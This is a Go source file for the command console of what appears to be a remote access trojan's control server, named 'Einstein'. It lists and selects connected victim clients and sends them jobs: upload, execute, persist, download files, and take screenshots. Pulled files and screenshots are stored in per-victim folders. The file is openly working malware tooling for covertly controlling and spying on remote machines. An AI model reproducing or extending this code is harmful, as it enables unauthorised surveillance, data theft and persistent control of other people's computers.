package neurons

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

const imageExtension = ".png"
const imageFolder = "Snaps"
const downloadsFolder = "Downloads"
const filePermissions = 0755
const uidMaskLength = 32

const greeting1 = `
/$$$$$$$$ /$$                       /$$               /$$          
| $$_____/|__/                      | $$              |__/          
| $$       /$$ /$$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$  /$$ /$$$$$$$ 
| $$$$$   | $$| $$__  $$ /$$_____/|_  $$_/   /$$__  $$| $$| $$__  $$
| $$__/   | $$| $$  \ $$|  $$$$$$   | $$    | $$$$$$$$| $$| $$  \ $$
| $$      | $$| $$  | $$ \____  $$  | $$ /$$| $$_____/| $$| $$  | $$
| $$$$$$$$| $$| $$  | $$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$| $$  | $$
|________/|__/|__/  |__/|_______/    \___/   \_______/|__/|__/  |__/`

// can't have backticks in those multiline strings so we stored it like this
var greeting2 = string([]byte{
	32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 44, 44, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32,
	32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 44, 44, 32, 32, 32, 32, 32,
	32, 32, 32, 32, 32, 32, 32, 32, 32, 13, 10, 96, 55, 77, 77, 34, 34, 34, 89, 77, 77, 32, 32, 32, 32, 100, 98, 32, 32, 32, 32, 32,
	32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 109, 109, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32,
	32, 32, 32, 32, 32, 100, 98, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 13, 10, 32, 32, 77, 77, 32, 32, 32, 32, 96,
	55, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 77,
	77, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32,
	13, 10, 32, 32, 77, 77, 32, 32, 32, 100, 32, 32, 32, 32, 96, 55, 77, 77, 32, 32, 96, 55, 77, 77, 112, 77, 77, 77, 98, 46, 32,
	32, 44, 112, 80, 34, 89, 98, 100, 32, 109, 109, 77, 77, 109, 109, 32, 32, 32, 46, 103, 80, 34, 89, 97, 32, 32, 96, 55, 77, 77,
	32, 32, 96, 55, 77, 77, 112, 77, 77, 77, 98, 46, 32, 32, 13, 10, 32, 32, 77, 77, 109, 109, 77, 77, 32, 32, 32, 32, 32, 32, 77,
	77, 32, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 56, 73, 32, 32, 32, 96, 34, 32, 32, 32, 77, 77, 32, 32, 32, 32, 44,
	77, 39, 32, 32, 32, 89, 98, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 13, 10, 32, 32, 77, 77,
	32, 32, 32, 89, 32, 32, 44, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 96, 89, 77, 77, 77, 97,
	46, 32, 32, 32, 77, 77, 32, 32, 32, 32, 56, 77, 34, 34, 34, 34, 34, 34, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 32,
	32, 77, 77, 32, 32, 13, 10, 32, 32, 77, 77, 32, 32, 32, 32, 32, 44, 77, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 32,
	32, 77, 77, 32, 32, 76, 46, 32, 32, 32, 73, 56, 32, 32, 32, 77, 77, 32, 32, 32, 32, 89, 77, 46, 32, 32, 32, 32, 44, 32, 32, 32,
	77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 32, 32, 77, 77, 32, 32, 13, 10, 46, 74, 77, 77, 109, 109, 109, 109, 77, 77, 77, 32, 46,
	74, 77, 77, 76, 46, 46, 74, 77, 77, 76, 32, 32, 74, 77, 77, 76, 46, 77, 57, 109, 109, 109, 80, 39, 32, 32, 32, 96, 77, 98, 109,
	111, 32, 32, 96, 77, 98, 109, 109, 100, 39, 32, 46, 74, 77, 77, 76, 46, 46, 74, 77, 77, 76, 32, 32, 74, 77, 77, 76, 46,
})

var axonRand *rand.Rand

func init() {
	// if really necessary it can also be seeded with a few bytes from crypo/rand.Read: https://stackoverflow.com/a/54491783
	axonRand = rand.New(rand.NewSource(time.Now().UnixNano()))
}

// prints ASCII art to console
func Greet() {
	// maybe i should just store these in a slice
	choice := axonRand.Intn(2)
	if choice == 0 {
		fmt.Println(greeting1)
	} else if choice == 1 {
		fmt.Println(greeting2)
	}
	fmt.Println()
}

// prints current selected client to console
func prompt() {
	if Clients.HasCurrent() {
		fmt.Printf("Einstein [%s...] > ", Clients.Current[:uidMaskLength])
	} else {
		fmt.Print("Einstein > ")
	}
}

// repeatedly get command input from console
func GetInput(exit chan<- struct{}) {
	var selectClientRE = regexp.MustCompile("select ([a-f0-9]{64})")
	scanner := bufio.NewScanner(os.Stdin)
	for prompt(); scanner.Scan(); prompt() {
		command := scanner.Text()
		switch {
		case command == "list":
			Clients.Display()
		case command == "select":
			if Clients.Size() == 1 {
				// retrieve the sole client in Clients.List in this weird way
				var uid string
				for k := range Clients.List {
					uid = k
				}
				Clients.Current = uid
			} else {
				fmt.Println("Ambiguous select statement.")
			}

		case selectClientRE.MatchString(command):
			uid := selectClientRE.FindStringSubmatch(command)[1]
			_, exists := Clients.List[uid]
			if exists {
				Clients.Current = uid
			} else {
				fmt.Printf("Client %s is not connected.\n", uid)
			}
		case strings.HasPrefix(command, "up "), strings.HasPrefix(command, "ex "), command == "persist":
			if Clients.HasCurrent() {
				client := Clients.GetCurrent()
				client.Jobs <- command
				response := <-client.Response
				log.Printf("'%s' response: %s\n", command, response)
			} else {
				fmt.Println("No client is selected.")
			}
		case strings.HasPrefix(command, "down "), command == "snap":
			if Clients.HasCurrent() {
				client := Clients.GetCurrent()
				// send job to client
				client.Jobs <- command
				// wait for response back from client
				fileData := <-client.Response
				var filename string
				var dir string
				if command == "snap" {
					filename = strings.Replace(time.Now().Format(time.RFC1123Z), ":", "-", -1) + imageExtension
					dir = imageFolder
				} else {
					filename = filepath.Base(strings.Split(command, " ")[1])
					dir = downloadsFolder
				}
				uidPath := filepath.Join(dir, client.Uid)
				if _, err := os.Stat(uidPath); os.IsNotExist(err) {
					os.MkdirAll(uidPath, filePermissions)
				}
				downloadPath := filepath.Join(uidPath, filename)
				err := os.WriteFile(downloadPath, fileData, filePermissions)
				if err != nil {
					log.Printf("Error writing %s: %s\n", filename, err)
				} else {
					log.Printf("File %s downloaded\n", filename)
				}
			} else {
				fmt.Printf("No client is selected.\n")
			}
		case command == "current":
			Clients.DisplayCurrent()
		case command == "unselect":
			if Clients.HasCurrent() {
				Clients.Current = ""
			} else {
				fmt.Println("No client is selected.")
			}
		case command == "exit" || command == "quit":
			exit <- struct{}{}
			return
		default:
			fmt.Println("Command not recognized.")
		}
	}
}
